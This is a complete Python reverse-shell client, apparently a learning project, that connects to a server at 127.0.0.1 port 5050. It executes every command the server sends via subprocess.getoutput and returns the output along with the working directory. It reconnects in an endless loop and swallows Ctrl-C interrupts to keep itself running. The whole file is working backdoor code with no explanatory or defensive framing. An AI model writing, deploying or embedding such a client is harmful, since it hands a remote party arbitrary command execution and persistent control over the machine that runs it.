import os
import time
import socket 
import threading
import subprocess

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5050
BUFFER_SIZE = 1024

def pwd():
    cwd = "cwd="+os.getcwd()
    return cwd.encode("utf-8")

def worker():
    # Try to connect
    s = socket.socket()
    while True:
        try:
            s.connect((SERVER_HOST, SERVER_PORT))
            print("Connected!")
            break
        except Exception as e:
            print("Connection Error: " + str(e))
            time.sleep(2)
            continue

    # Welcome message
    message = s.recv(BUFFER_SIZE).decode("utf-8")
    print("Server:", message)
    s.send(pwd())

    # Get new commands
    while True:
        command = s.recv(BUFFER_SIZE).decode("utf-8")
        if command.lower() == "exit" or len(command) == 0:
            break

        output = subprocess.getoutput(command)

        s.send(output.encode("utf-8"))
        s.send(pwd())

    print("Connection Closed")
    s.close()

# Run the client
if __name__ == '__main__':
    while True:
        try:
            print("Creating new worker...")
            t = threading.Thread(target=worker)
            t.start()
            t.join()
            print("Worker terminated\n")
        except KeyboardInterrupt:
            print("SIGINT received")
            continue